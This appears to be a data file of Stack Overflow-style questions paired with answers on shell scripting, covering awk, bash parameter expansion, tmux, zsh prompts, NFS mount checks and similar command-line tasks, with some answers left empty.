    "Convert column to matrix format using awk": "The following awk script handles :\nany size of matrix\nno relation between row and column indices so it keeps track of them separately.\nIf a certain row column index does not appear, the value will default to zero.\nThis is done in this way:\nawk '\nBEGIN{PROCINFO[\"sorted_in\"] = \"@ind_num_asc\"}\n(NR==1){next}\n{row[$1]=1;col[$2]=1;val[$1\" \"$2]=$3}\nEND { printf \"%8s\",\"\"; for (j in col) { printf \"%8.3f\",j }; printf \"\\n\"\n      for (i in row) {\n        printf \"%8.3f\",i; for (j in col) { printf \"%8.3f\",val[i\" \"j] }; printf \"\\n\"\n      }\n    }' <file>\nHow does it work:\nPROCINFO[\"sorted_in\"] = \"@ind_num_asc\", states that all arrays are sorted numerically by index.\n(NR==1){next} : skip the first line\n{row[$1]=1;col[$2]=1;val[$1\" \"$2]=$3}, process the line by storing the row and column index and accompanying value.\nThe end statement does all the printing.\nThis outputs:\n          20.500  21.500  22.500\n  20.500  -4.100   1.200   7.000\n  21.500  -6.200   4.300  10.400\n  22.500   0.000   6.000  16.700\nnote: the usage of PROCINFO is a gawk feature.\nHowever, if you make a couple of assumptions, you can do it much shorter:\nthe file contains all possible entries, no missing values\nyou do not want the indices of the rows and columns printed out:\nthe indices are sorted in column-major-order\nThe you can use the following short versions:\nsort -g <file> | awk '($1+0!=$1){next}\n                      ($1!=o)&&(NR!=1){printf \"\\n\"}\n                      {printf \"%8.3f\",$3; o=$1 }'\nwhich outputs\n  -4.100   1.200   7.000\n  -6.200   4.300  10.400\n   0.000   6.000  16.700\nor for the transposed:\nawk '(NR==1){next}\n     ($2!=o)&&(NR!=2){printf \"\\n\"}\n     {printf \"%8.3f\",$3; o=$2 }' <file>\nThis outputs\n  -4.100  -6.200   0.000\n   1.200   4.300   6.000\n   7.000  10.400  16.700",
    "How to use xargs to replace 2 arguments": "You can use bash -c in xargs and use BASH's string replacement:\nfind . -name \"*.svg\" -print0 |\nxargs -0 -I {} bash -c 'svgexport \"$1\" \"${1%.svg}.jpg\"' - {}",
    "Features obligatory for TERM=dumb terminal": "Going to the source can help. The terminal database has comments. Here is a slice from that:\n#### Specials\n#\n# Special \"terminals\".  These are used to label tty lines when you don't\n# know what kind of terminal is on it.  The characteristics of an unknown\n# terminal are the lowest common denominator - they look about like a ti 700.\n#\n\ndumb|80-column dumb tty,\n        am,\n        cols#80,\n        bel=^G, cr=^M, cud1=^J, ind=^J,\nunknown|unknown terminal type,\n        gn, use=dumb,\nThe \"dumb\" and \"unknown\" terminal types are assumed, but rarely used:\n\"dumb\" has automargins (text \"wraps\" at the right margin), is assumed to have 80 columns, and an ASCII BEL and carriage return. For lack of something better, cud1 (cursor down) is an ASCII line-feed. The ind (index) value is the same, implying that text scrolls up when you reach the bottom of the screen.\nThere is no cursor-addressing (cup) nor alternates (such as moving along a row or column arbitrarily).\n\"unknown\" adds the \"generic\" flag, which marks it as unsuitable for use by curses applications. Think of it as a printer.\nAs for minimum requirements, that actually depends upon the individual application. ncurses can manage to move around the screen without actually having cup. It works with a half-dozen strategies. If you read the source for mvcur, you can get an idea of what it needs.\nHowever, applications such as mc do not simply rely upon ncurses to decide if it works, since (in this case) it may link with slang (which doesn't check that closely). So mc does its own checks, which may add restrictions.\nIn practice, unless you choose a limited terminal description such as \"dumb\", most of the terminals you are likely to encounter will work.\nFurther reading:\nterminfo - terminal capability data base\ncurses interfaces to terminfo database (including mvcur)\nncurses/tty/lib_mvcur.c",
    "BASH: Path difference between two paths?": "You can strip one string from the other with:\necho \"${string1#\"$string2\"}\"\nSee:\n$ string1=\"a/b/c/d/e/f\"\n$ string2=\"a/b/c/d\"\n$ echo \"${string1#\"$string2\"}\"\n/e/f\nFrom man bash -> Shell parameter expansion:\n${parameter#word}\n${parameter##word}\nThe word is expanded to produce a pattern just as in filename expansion. If the pattern matches the beginning of the expanded value of parameter, then the result of the expansion is the expanded value of parameter with the shortest matching pattern (the \u2018#\u2019 case) or the longest matching pattern (the \u2018##\u2019 case) deleted.\nWith spaces:\n$ string1=\"hello/i am here/foo/bar\"\n$ string2=\"hello/i am here/foo\"\n$ echo \"${string1#\"$string2\"}\"\n/bar\nTo \"clean\" multiple slashes, you can follow Roberto Reale's suggestion and canonicalize the paths with readlink -m to allow comparison with strings with the same real path up:\n$ string1=\"/a///b/c//d/e/f/\"\n$ readlink -m $string1\n/a/b/c/d/e/f",
    "How to measure time from adb shell with milliseconds resolution?": "",
    "How can I replace the last character of a string with another character in bash?": "for file in *.c; do \n   echo \"${file%?}s\"\ndone\nIn parameter substitution, ${VAR%PAT} will remove the last characters matching PAT from variable VAR. Shell patterns * and ? can be used as wildcards.\nThe above drops the final character, and appends \"s\".",
    "Prevent Bash word splitting in substring": "Use an array:\nfiles=( file1 'foo bar' )\nls -la \"${files[@]}\"",
    "Perl: console / command-line tool for interactive code evaluation and testing": "   perl -d -e 1\nIs perfectly suitable, I've been using it for years and years. But if you just can't, then you can check out Devel::REPL",
    "Find currently connected port number SSH": "An OpenSSH server will set the variable $SSH_CLIENT, which contains the current ip, client port and server port separated by spaces:\n$ echo \"$SSH_CLIENT\"\n127.0.0.1 59064 22\nTo get the port number the current session is connected to, you can therefore use echo ${SSH_CLIENT##* }.",
    "How to make Emacs 's shell mode source my profile file?": "You can create a file ~/.emacs_zsh (or .emacs_bash, emacs_sh, ...) that shell-mode will use on startup. My .emacs_bash is simply:\n. ~/.profile\nJust be sure to put a newline at the end of the sourcing line or it won't get executed.",
    "Insert copyright message into multiple files": "#!/bin/bash\nfor file in *; do\n  echo \"Copyright\" > tempfile;\n  cat $file >> tempfile;\n  mv tempfile $file;\ndone\nRecursive solution (finds all .txt files in all subdirectories):\n#!/bin/bash\nfor file in $(find . -type f -name \\*.txt); do\n  echo \"Copyright\" > copyright-file.txt;\n  echo \"\" >> copyright-file.txt;\n  cat $file >> copyright-file.txt;\n  mv copyright-file.txt $file;\ndone\nUse caution; if spaces exist in file names you might get unexpected behaviour.",
    "Linux permission denied after chmod a=rwx": "The file system hosting your script might be mounted with the noexec flag. Check your /etc/fstab entry for that file system and if there's a noexec there try removing it then remounting that file system via mount /path/to/mountpoint -o remount\nOn second thought, check the output of the mount command for noexec instances instead of /etc/fstab (the file system might have been mounted dynamically.)",
    "tqdm in screen environment printing new line and unknown charactors": "As you guessed, the problem is caused by the unknown characters. Running screen in UTF-8 mode will solve that:\nscreen -U",
    "List all directories sorted by size in descending order": "-g is for floats. For human-readable output use human-readable sort:\ndu -sh * | sort -rh\nIf you have numfmt utility from coreutils, you can use numeric sort with numfmt formatting:\ndu -B 1 -s * | sort -rn | numfmt --to=iec -d$'\\t' --field=1",
    "Check if trap is set in Bash": "Yes.\nYou can either see all traps, or traps for a specific signal:\n$ trap            # show all traps for all signals\n$ trap -p SIGINT  # only show traps for SIGINT\n$ trap -p EXIT    # only show traps for EXIT",
    "What does it mean to add a directory to your PATH?": "Adding a directory to your PATH expands the # of directories that are searched when, from any directory, you enter a command in the shell.\nSee http://www.linfo.org/path_env_var.html for more: \"A user's PATH consists of a series of colon-separated absolute paths that are stored in plain text files. Whenever a user types in a command at the command line that is not built into the shell or that does not include its absolute path and then presses the Enter key, the shell searches through those directories, which constitute the user's search path, until it finds an executable file with that name.\"",
    "How to use a variable in a CURL request with bash?": "Using jq for this, as Charles Duffy's answer suggests, is a very good idea. However, if you can't or do not want to install jq here is what you can do with plain POSIX shell.\n#!/bin/sh\nset -e\n\ncurrent_ip=\"$(curl --silent --show-error --fail ipecho.net/plain)\"\necho \"IP: $current_ip\"\n\n# Update A record\ncurl -X PUT \"https://api.cloudflare.com/client/v4/zones/ZONEIDHERE/dns_records/DNSRECORDHERE\" \\\n    -H \"X-Auth-Email: EMAILHERE\" \\\n    -H \"X-Auth-Key: AUTHKEYHERE\" \\\n    -H \"Content-Type: application/json\" \\\n    --data @- <<END;\n{\n    \"id\": \"ZONEIDHERE\",\n    \"type\": \"A\",\n    \"name\": \"example.com\",\n    \"content\": \"$current_ip\",\n    \"zone_name\": \"example.com\"\n}\nEND",
    "How do I recursively unzip nested ZIP files?": "Thanks Cyrus! The master wizard Shawn J. Goff had the perfect script for this:\nwhile [ \"`find . -type f -name '*.zip' | wc -l`\" -gt 0 ]; do find -type f -name \"*.zip\" -exec unzip -- '{}' \\; -exec rm -- '{}' \\;; done",
    "How to get the second latest file in a folder in Linux": "Building on the linked solutions, you can just make tail keep the last two files, and then pass the result through head to keep the first one of those:\nls -Art | tail -n 2 | head -n 1",
    "Check if argument is a file or directory": "[ -f \"$filename\" ] is true for files, [ -d \"$dirname\" ] is true for directories.",
    "Shell Scripts in Mac OS X run from home directory?": "The behaviour seems consistent to me. It inherits your finder instances environment, which would be rooted at your home directory.\nHowever, it's not too hard to fix.\ncd \"$(dirname \"$0\")\"\nOught to do the trick ala:\nrichh-desktop % fullname.sh \n/home/richh/bin\nrichh-desktop % cd .. \nrichh-desktop % fullname.sh \n/home/richh/bin\nrichh-desktop %        ",
    "Getting an error \"cd: '/Users/x/Downloads/' is a rotten symlink\" in Fish shell": "Your terminal app is forbidden from accessing the Downloads directory. You can fix it like so:\nOpen Security and Privacy preference pane\nClick on the Privacy tab\nSelect \"Files and Folders\" in the side bar\nFind your terminal app, and ensure that the Downloads directory is checked for it\nYou'll have to relaunch the terminal before it can get access.",
    "Correct way to export multiple LD_LIBRARY_PATHs": "Your approach should work, i.e., you are adding several paths to LD_LIBRARY_PATH (rather than overwriting), however there are two pitfalls to watch out for.\n(1) prefer to quote the LD_LIBRARY_PATH as in:\nexport LD_LIBRARY_PATH=\"$LD_LIBRARY_PATH\":/home/robolab/.mujoco/mujoco200/bin\n... so that embedded spaces within LD_LIBRARY_PATH does not cause a problem.\n(2) Consider the order of putting the paths toegether, eg, you could alternatively do\nexport LD_LIBRARY_PATH=/home/robolab/.mujoco/mujoco200/bin:\"$LD_LIBRARY_PATH\"\nIf you experiment with both approaches and then echo $LD_LIBRARY_PATH you will see it changes the order of the paths, and this can be important if you have the same libraries in several locations.",
    "Adding SQS redrive policy using AWS CLI command": "",
    "How to open a file in a specific application from FZF": "Based on your comments, it is possible the only problem comes from this part :\n${EDITOR:-atom}\nThis expands to the content of variable EDITOR if has a non-null value, and to atom if it is null or unset. It is likely you have that variable initialized to something else than atom. Try using simply atom instead, like this:\nfe() {\nlocal files\n  IFS=$'\\n' files=($(fzf-tmux --query=\"$1\" --multi --select-1 --exit-0))\n  [[ -n \"$files\" ]] && atom \"${files[@]}\"\n}\nOf course, you can also keep the function as it already is, but make sure your environment contains something like EDITOR=atom.",
    "Linux - Shell script run curl command in parallel": "I think a bash script like:\n#!/bin/bash\n\ncurl -s http://localhost/process.php?id=1 &\ncurl -s http://localhost/process.php?id=2 &\ncurl -s http://localhost/process.php?id=3 &\nHowever, this is starting all tasks as background processes. Don't know how crucial simultaneous starting of the process is.",
    "Spark Job Keep on Running": "You can achieve this by couple of ways\n1)You can run the spark submit driver process in background using nohup Eg:\nnohup  ./spark-submit --class  customer.core.classname \\\n  --master yarn --numexecutors 2 \\\n  --driver-memory 2g --executor-memory 2g --executor-cores 1 \\\n  /home/hdfs/Test/classname-0.0.1-SNAPSHOT-SNAPSHOT.jar \\\n  newdata host:6667 &\n2)Run in deploy mode as cluster so that driver process runs in different node.",
    "How to combine images in Ruby": "Try: 'rmagick' gem\nrequire 'rmagick'\n\nimage_list = Magick::ImageList.new(\"image1.png\", \"image2.png\", \"image3.png\")\nimage_list.write(\"combine.png\")\nYou can also refer this SO Question it's similar to yours.",
    "How can I source an R file from the parent directory via the shell?": "",
    "subprocess.call() arguments ignored when using shell=True w/ list [duplicate]": "When shell is True, the first argument is appended to [\"/bin/sh\", \"-c\"]. If that argument is a list, the resulting list is\n[\"/bin/sh\", \"-c\", \"ls\", \"-al\"]\nThat is, only ls, not ls -al is used as the argument to the -c option. -al is used as the first argument the shell itself, not ls.\nWhen using shell=True, you generally just want to pass a single string and let the shell split it according the shell's normal word-splitting rules.\n# Produces [\"/bin/sh\", \"-c\", \"ls -al\"]\nsubprocess.call(\"ls -al\", shell=True)\nIn your case, it doesn't see like you need to use shell=True at all.",
    "bash: Possible to require double Ctrl-c to to exit a script?": "I had a slightly different use case, and wanted to leave the solution here, as Google led me to this topic. You can keep running a command, and allow the user to restart it with one CTRL+C, and kill it with double CTRL+C in the following manner:\ntrap_ctrlC() {\n    echo \"Press CTRL-C again to kill. Restarting in 2 second\"\n    sleep 2 || exit 1\n}\n\ntrap trap_ctrlC SIGINT SIGTERM\n\nwhile true; do  \n    ... your stuff here ...\ndone",
    "How good is using %q in Lua to escape shell arguments?": "No, using %q is not good enough. Dollar signs and backticks are not escaped, which can be abused to expose the contents of environment variables, or worse, execute arbitrary commands.",
    "passing arguments to shell script from udev rules file": "You should be able to use single quotes instead of the double quotes you mentioned:\nACTION==\"add\", RUN+=\"/appmount/scripts/usb_mount.sh '%E{ID_FS_LABEL}' '%E{DEVNAME}'\"\nBeware: I didn't test this. Maybe variable substitution will fail within single quotes...\nQuoting from man udev about the key \"RUN\":\nThe program name and following arguments are separated by spaces. Single quotes can be used to specify arguments with spaces.",
    "Custom Oh My Zsh theme: long prompts disappear / cut off": "Incidentally, your link is broken, highlighting one of the issues with posting a link to code instead of code itself - any future viewers of your question can't get a full picture.\nI think your problem is that the 'color' characters you use should be escaped in a pair of %{...%}:\n%{...%}\nInclude  a string as a literal escape sequence.  The string within the braces\nshould not change the cursor position.  Brace pairs can nest.\nUsing your latest commit on github, I don't see this issue - did you fix it? However, I'm seeing some issues with cursor placement and line-drawing, particularly with TAB. When pressing TAB, the cursor is moved up one line:\nPressed TAB here. Pressed TAB here.\nThe PROMPT is being re-drawn 'up' one line every time. This is fixed by encapsulating the color codes within the %{...%}:\n# Solarized Dark colour scheme\nBOLD=\"%{$(tput bold)%}\"\nRESET=\"%{$(tput sgr0)%}\"\nSOLAR_YELLOW=\"%{$(tput setaf 136)%}\"\nSOLAR_ORANGE=\"%{$(tput setaf 166)%}\"\nSOLAR_RED=\"%{$(tput setaf 124)%}\"\nSOLAR_MAGENTA=\"%{$(tput setaf 125)%}\"\nSOLAR_VIOLET=\"%{$(tput setaf 61)%}\"\nSOLAR_BLUE=\"%{$(tput setaf 33)%}\"\nSOLAR_CYAN=\"%{$(tput setaf 37)%}\"\nSOLAR_GREEN=\"%{$(tput setaf 64)%}\"\nSOLAR_WHITE=\"%{$(tput setaf 254)%}\"\nI'm not 100% sure without the original ~/.zshrc, but this should improve your prompt a little. :)\nApart from the orange, you can also use a terminal-based Solarized profile and the zsh colors, which might be more portable. I couldn't get the orange right without tput, though.\n#autoload colors && colors\n#SOLAR_YELLOW=\"%{$fg[yellow]%}\"\n#SOLAR_ORANGE=\"%{$(tput setaf 166)%}\"\n#SOLAR_RED=\"%{$fg[red]%}\"\n#SOLAR_MAGENTA=\"%{$fg[magenta]%}\"\n#SOLAR_VIOLET=\"%{$fg_bold[magenta]%}\"\n#SOLAR_BLUE=\"%{$fg[blue]%}\"\n#SOLAR_CYAN=\"%{$fg[cyan]%}\"\n#SOLAR_GREEN=\"%{$fg[green]%}\"\n#SOLAR_WHITE=\"%{$fg[white]%}\"",
    "Renaming files with Bash, removing prefix and suffix": "Another approach, for fun, using regular expressions:\nregex='prefix - (.*) - suffix.txt'\nfor f in *.txt; do\n    [[ $f =~ $regex ]] && mv \"$f\" \"${BASH_REMATCH[1]}.txt\"\ndone\nActually, using the simple pattern '*.txt' here has two problems:\nIt's too broad; you may need to apply the regex to a lot of non-matching files.\nIf there are a lot of files in the current directory, the command line could overflow.\nUsing find complicates the procedure, but is more correct:\nfind . -maxdepth 1 -regex 'prefix - .* - suffix.txt' -print0 | \\\n  while read -d '' -r; do\n   [[ $REPLY =~ $regex ]] && mv \"$REPLY\" \"${BASH_REMATCH[1]}.txt\"\n  done",
    "Convert first letter of given file to lower case": "You can do that with sed:\nsed -e 's/./\\L&/' Shell.txt\n(Probably safer to do\nsed -e 's/^./\\L&\\E/' Shell.txt\nif you ever want to extend this.)",
    "echoing in shell -n doesn't get printed the right thing": "Try\nprintf \"%s\\n\" -n\nor\nprintf \"%s\\n\" '-n'",
    "Alternatives to xargs -l": "You can use -exec and {} features of the find command so you don't need any pipes at all:\nfind -maxdepth 1 -type d -name \"*.y\" -mtime +`expr 2 \\* 365` -exec mv \"{}\" \"{}.old\" \\;\nAlso you don't need to specify '.' path - this is default for find. And you used extra slashes in \"*.y\". Of course if your file names do not really contain quotes.\nIn fairness it should be noted, that version with while read loop is the fastest of proposed here. Here are some example measurements:\n$ cat measure \n#!/bin/sh\ncase $2 in\n  1) find \"$1\" -print0 | xargs -0 -I file echo mv file file.old ;;\n\n  2) find \"$1\" -exec echo mv '{}' '{}.old' \\; ;;\n\n  3) find \"$1\" | while read file; do\n       echo mv \"$file\" \"$file.old\"\n     done;;\nesac\n$ time ./measure android-ndk-r5c 1 | wc\n   6225   18675  955493\nreal    0m6.585s\nuser    0m18.933s\nsys     0m4.476s\n$ time ./measure android-ndk-r5c 2 | wc\n   6225   18675  955493\nreal    0m6.877s\nuser    0m18.517s\nsys     0m4.788s\n$ time ./measure android-ndk-r5c 3 | wc\n   6225   18675  955493\nreal    0m0.262s\nuser    0m0.088s\nsys     0m0.236s\nI think it's because find and xargs invokes additional /bin/sh (actually exec(3) does it) every time for execute a command, while shell while loop do not.\nUpd: If your busybox version was compiled without -exec option support for the find command then the while loop or xargs, suggested in the other answers (one, two), is your way.",
    "How can I set the PATH for supervisord so it finds the executables": "You can add it in the command using env:\n[program:web]\ncommand=env PATH=\"/path/to/where/node/executable/is\" node web.js -c config.json\nIt seems environment does not work on some cases.",
    "Pipe implementation": "You need to replace one child's stdout with the writing end of the pipe, and the other child's stdin with the reading end:\nif (pid == 0)  \n{  \n   close(fd[0]); //close read from pipe, in parent\n   dup2(fd[1], STDOUT_FILENO); // Replace stdout with the write end of the pipe\n   close(fd[1]); // Don't need another copy of the pipe write end hanging about\n   execlp(\"cat\", \"cat\", \"names.txt\", NULL);\n}\nelse\n{\n   close(fd[1]); //close write to pipe, in child\n   dup2(fd[0], STDIN_FILENO); // Replace stdin with the read end of the pipe\n   close(fd[0]); // Don't need another copy of the pipe read end hanging about\n   execlp(\"sort\", \"sort\", NULL);\n} ",
    "escape character in vim command": "As you type the command, use control-v then escape to enter the escape.\nHowever, I have to question whether vim is the right tool for this job. Normally, you would be better off with something like sed. That said, I'm not quite clear what the vim command is up to, so maybe you do need it.",
    "How do I capture a SQLPlus exit code within a shell script?": "Have you tried using\nwhenever sqlerror exit sql.sqlcode\nin your sql script? (also see this link)",
    "Source shell script into environment within a ruby script": "Given the following Ruby\n# Read in the bash environment, after an optional command.\n#   Returns Array of key/value pairs.\ndef bash_env(cmd=nil)\n  env = `#{cmd + ';' if cmd} printenv`\n  env.split(/\\n/).map {|l| l.split(/=/)}\nend\n\n# Source a given file, and compare environment before and after.\n#   Returns Hash of any keys that have changed.\ndef bash_source(file)\n  Hash[ bash_env(\". #{File.realpath file}\") - bash_env() ]\nend\n\n# Find variables changed as a result of sourcing the given file, \n#   and update in ENV.\ndef source_env_from(file)\n  bash_source(file).each {|k,v| ENV[k] = v }\nend\nand the following test.sh:\n#!/usr/bin/env bash\nexport FOO='bar'\nyou should get:\nirb(main):019:0> source_env_from('test.sh')\n=> {\"FOO\"=>\"bar\"}\nirb(main):020:0> ENV['FOO']\n=> \"bar\"\nEnjoy!",
    "Kubectl: get a shell to a running container under Windows": "Seems it might be related to this github issue.\nOne of the workarounds might be to use winpty as specified here.\nwinpty kubectl.exe exec -it pod-name -- sh\nYou can also try /bin/sh instead of /bin/bash it worked for me, but I do not have a Windows machine to check it in the same environment as you.",
    "get json object from stringify object using jq filter in shell script": "fromjson is your friend:\n$ jq '.categoriesListArr | fromjson' detail.json\nOr, if you want to retain the original structure:\n$ jq '.categoriesListArr |= fromjson' detail.json",
    "Print specific lines of a file in Terminal [duplicate]": "yes awk and sed can help\nfor lines 5 to 10\nawk 'NR>4&&NR<11' file.txt\nsed -n '5,10p' file.txt\nfor lines 10 to last line\nawk 'NR>9' file.txt\nsed -n '10,$p' file.txt",
    "Filter special chars such as color codes from shell output": "In the unlikely case when you have xterm256 color codes as well, this will filter both 'normal' ansi and xterm256 ansi codes:\nimport re\nprint(re.sub(r'\\x1b(\\[.*?[@-~]|\\].*?(\\x07|\\x1b\\\\))', '', a))\nor in a slightly less obfuscated and more readable form:\n'(' + CSI + '.*?' + CMD + '|' + OSC + '.*?' + '(' + ST + '|' + BEL + ')' + ')'\nComplete code with tests:\nimport re\n\ntests = [\n    u\"22200K .......\\u001b[0m\\u001b[91m... .......... ...\\u001b[0m\\u001b[91m.\\u001b[0m\\u001b[91m...... .........\\u001b[0m\\u001b[91m.\\u001b[0m\\u001b[91m \\u001b[0m\\u001b[91m.\\u001b[0m\\u001b[91m.\\u001b[0m\\u001b[91m.\\u001b[0m\\u001b[91m.\\u001b[0m\\u001b[91m...... 50% 28.6K 12m55s\",\n    u\"=\\u001b[m=\",\n    u\"-\\u001b]23\\u0007-\",\n]\n\ndef trim_ansi(a):\n    ESC = r'\\x1b'\n    CSI = ESC + r'\\['\n    OSC = ESC + r'\\]'\n    CMD = '[@-~]'\n    ST = ESC + r'\\\\'\n    BEL = r'\\x07'\n    pattern = '(' + CSI + '.*?' + CMD + '|' + OSC + '.*?' + '(' + ST + '|' + BEL + ')' + ')'\n    return re.sub(pattern, '', a)\n\nfor t in tests:\n    print(trim_ansi(t))\nAs a one-liner:\nls --color | python -c 'import re, sys; sys.stdout.write(re.sub(r\"\\x1b(\\[.*?[@-~]|\\].*?(\\x07|\\x1b\\\\))\", \"\", sys.stdin.read()))'",
    "grep: Invalid regular expression": "Use grep -F to treat the search pattern as a fixed string. You could also replace wc -l with grep -c.\ngrep -cF \",[\" loaded.txt > newloaded.txt\nIf you're curious, [ is a special character. If you don't use -F then you'll need to escape it with a backslash.\ngrep -c \",\\[\" loaded.txt > newloaded.txt\nBy the way, I'm not sure why you're using wc -l anyways...? From your problem description, it sounds like grep -v might be more appropriate. -v inverts grep's normal output, printing lines that don't match.\ngrep -vF \",[\" loaded.txt > newloaded.txt",
    "Zsh show fail every time when I open my terminal": "You might want to look at a duplicate question: Zshell starts up with exit status of 1 after uninstalling RVM\nIt has an answer that solved the issue for me:\nI found a .zlogin file on my system that contained some rvm-related code. I've deleted the code, and the problem is solved!",
    "Pipe two different outputs into a command that takes two inputs": "Good news! You can use process substitution in bash:\ndiff <(cut -d, -f1 file1) <(cut -d, -f1 file2)",
    "escape a string for shell commands in Python [duplicate]": "In Python 3.3 you can use shlex.quote to return a shell-escaped version of a string. It is the successor of pipes.quote, which was deprecated since Python 1.6. Note that the documentation recommends this for cases where you cannot use a list, as suggested in another answer. Also according to the documentation, the quoting is compatible with UNIX shells. I can't guarantee that it will work for your case, but a quick test with rm, using pipes because I don't have Python 3.3:\n$ touch \\(a\\ b\\)\n$ ls\n(a b)\n\n>>> import subprocess, pipes\n>>> filename = pipes.quote(\"(a b)\")\n>>> command = 'rm {}'.format(filename)\n>>> subprocess.Popen(command, shell=True)\n\n$ ls\n$",
    "zsh tab completion messes up command line formatting": "I had the same issue on PopOS and Arch linux. I tried a bunch of solutions from various places but the only solution that worked for me was this suggestion by romkatv on an issue on the oh-my-zsh github repository.\nThe solution is to make a copy of the .zsh-theme file of whatever theme you're using in oh-my-zsh and surround all non-ASCII characters (like emojis) with %{%G<CHARACTER>%}\nFor example, the default oh-my-zsh theme robbyrussel contains 2 non-ASCII characters. The '\u279c' character in the prompt\nPROMPT=\"%(?:%{$fg_bold[green]%}\u279c :%{$fg_bold[red]%}\u279c )\"\nand the '\u2717' character in the prompt for git directories\nZSH_THEME_GIT_PROMPT_DIRTY=\"%{$fg[blue]%}) %{$fg[yellow]%}\u2717\"\nUsing %{%G<character>%} around the 2 non-ASCII characters like this\nPROMPT=\"%(?:%{$fg_bold[green]%}%{%G\u279c%} :%{$fg_bold[red]%}%{%G\u279c%} )\"\nand this\nZSH_THEME_GIT_PROMPT_DIRTY=\"%{$fg[blue]%}) %{$fg[yellow]%}%{%G\u2717%}\"\nsolved the issue for me.",
    "Linux Shell Script: How to detect NFS Mount-point (or the Server) is dead?": "\"stat\" command is a somewhat cleaner way:\nstatresult=`stat /my/mountpoint 2>&1 | grep -i \"stale\"`\nif [ \"${statresult}\" != \"\" ]; then\n  #result not empty: mountpoint is stale; remove it\n  umount -f /my/mountpoint\nfi\nAdditionally, you can use rpcinfo to detect whether the remote nfs share is available:\nrpcinfo -t remote.system.net nfs > /dev/null 2>&1\nif [ $? -eq 0 ]; then\n  echo Remote NFS share available.\nfi\nAdded 2013-07-15T14:31:18-05:00:\nI looked into this further as I am also working on a script that needs to recognize stale mountpoints. Inspired by one of the replies to \"Is there a good way to detect a stale NFS mount\", I think the following may be the most reliable way to check for staleness of a specific mountpoint in bash:\nread -t1 < <(stat -t \"/my/mountpoint\")\nif [ $? -eq 1 ]; then\n   echo NFS mount stale. Removing... \n   umount -f -l /my/mountpoint\nfi\n\"read -t1\" construct reliably times out the subshell if stat command hangs for some reason.\nAdded 2013-07-17T12:03:23-05:00:\nAlthough read -t1 < <(stat -t \"/my/mountpoint\") works, there doesn't seem to be a way to mute its error output when the mountpoint is stale. Adding > /dev/null 2>&1 either within the subshell, or in the end of the command line breaks it. Using a simple test: if [ -d /path/to/mountpoint ] ; then ... fi also works, and may preferable in scripts. After much testing it is what I ended up using.\nAdded 2013-07-19T13:51:27-05:00:\nA reply to my question \"How can I use read timeouts with stat?\" provided additional detail about muting the output of stat (or rpcinfo) when the target is not available and the command hangs for a few minutes before it would time out on its own. While [ -d /some/mountpoint ] can be used to detect a stale mountpoint, there is no similar alternative for rpcinfo, and hence use of read -t1 redirection is the best option. The output from the subshell can be muted with 2>&-. Here is an example from CodeMonkey's response:\nmountpoint=\"/my/mountpoint\"\nread -t1 < <(stat -t \"$mountpoint\" 2>&-)\nif [[ -n \"$REPLY\" ]]; then\n  echo \"NFS mount stale. Removing...\"\n  umount -f -l \"$mountpoint\"\nfi\nPerhaps now this question is fully answered :).",
    "Is there any website having command line environment of Linux, for practicing commands? [closed]": "There is a quite a good one here:\nJavascript PC Emulator - http://bellard.org/jslinux/\nRelated:\nHow does Linux emulator in Javascript by Fabrice Bellard work?\nSimulating linux terminal in browser",
    "How to stop making tmux auto setting RBENV_VERSION": "tmux itself will never set (or unset) RBENV_VERSION of its own accord. You have some bit of configuration that is causing this.\nMy guess is that RBENV_VERSION was set when you started your tmux server and that is is now part of the tmux \u201cglobal environment\u201d (the base environment inherited by all the processes started by tmux). You can check this\ntmux show-environment -g | grep RBENV\nIf it is present there, you can delete it with this command:\ntmux set-environment -gu RBENV_VERSION\nIf you often find yourself starting tmux when RBENV_VERSION is already set (and you do not want it sent \u201cinside\u201d tmux), then you can add the above command to your ~/.tmux.conf file to make sure that it is cleared every time you start a server.\nAnother possibility is that it is part of your tmux \u201csession environment\u201d; this environment is \u201clayered\u201d atop the global environment to form the environment that is inherited by the processes started for new windows and panes in a session. You can check it with this command (run it inside the session, or add -t sessname to specify a session):\ntmux show-environment | grep RBENV\nIf this is present, you can unset it in a similar way:\ntmux set-environment -u RBENV_VERSION\nFinally, if the variable is not present in either the global or session environments, then it is probably coming from something in your shell initialization files. By default, tmux starts login shells, so be sure to check the corresponding bits of shell configuration (e.g. .bash_profile, .bash_login, .profile, etc.) as well as any other bits of initialization.",
    "How to stop Xcode build from shell script": "You need to return a non-zero exit code from the script:\nexit 1",
    "MySQL from the command line - can I practically use LOCKs?": "[EDIT]\nnos had the basic idea -- only run \"mysql\" once, and the solution nos provided should work, but it left the FIFO on disk.\nnos was also correct that I screwed up: a simple \"echo X >FIFO\" will close the FIFO; I remembered wrongly. And my (removed) comments w.r.t. timing don't apply, sorry.\nThat said, you don't need a FIFO, you could use an inter-process pipe. And looking through my old MySQL scripts, some worked akin to this, but you cannot let any commands write to stdout (without some \"exec\" tricks).\n#!/bin/bash\n(\n  echo \"LOCK TABLES mytable READ ;\"\n  echo \"Doing something...\" >&2\n  echo \"describe mytable;\" \n  sleep 5\n  echo \"UNLOCK  tables;\" \n) | mysql ${ARGUMENTS}\nAnother option might be to assign a file descriptor to the FIFO, then have it run in the background. This is very similar to what nos did, but the \"exec\" option wouldn't require a subshell to run the bash commands; hence would allow you to set \"RC\" in the \"other stuff\":\n#!/bin/bash\n# Use the PID ($$) in the FIFO and remove it on exit:\nFIFO=\"/tmp/mysql-pipe.$$\"\nmkfifo ${FIFO} || exit $?\nRC=0\n\n# Tie FD3 to the FIFO (only for writing), then start MySQL in the u\n# background with its input from the FIFO:\nexec 3<>${FIFO}\n\nmysql ${ARGUMENTS} <${FIFO} &\nMYSQL=$!\ntrap \"rm -f ${FIFO};kill -1 ${MYSQL} 2>&-\" 0\n\n# Now lock the table...\necho \"LOCK TABLES mytable WRITE;\" >&3\n\n# ... do your other stuff here, set RC ...\necho \"DESCRIBE mytable;\" >&3\nsleep 5\nRC=3\n# ...\n\necho \"UNLOCK TABLES;\" >&3\nexec 3>&-\n\n# You probably wish to sleep for a bit, or wait on ${MYSQL} before you exit\nexit ${RC}\nNote that there are a few control issues:\nThis code has NO ERROR CHECKING for failure to lock (or any SQL commands within the \"other stuff\"). And that's definitely non-trivial.\nSince in the first example, the \"other stuff\" is within a subshell, you cannot easily set the return code of the script from that context.",
    "what is Visual Studio 2008 Shell (integrated mode)?": "SQL Server 2008 Management Studio using the VS 2008 Shell. (That's why it looks and feels just like Visual Studio).",
    "Troubleshooting ssh login failure for AWS EC2 using powershell": "",
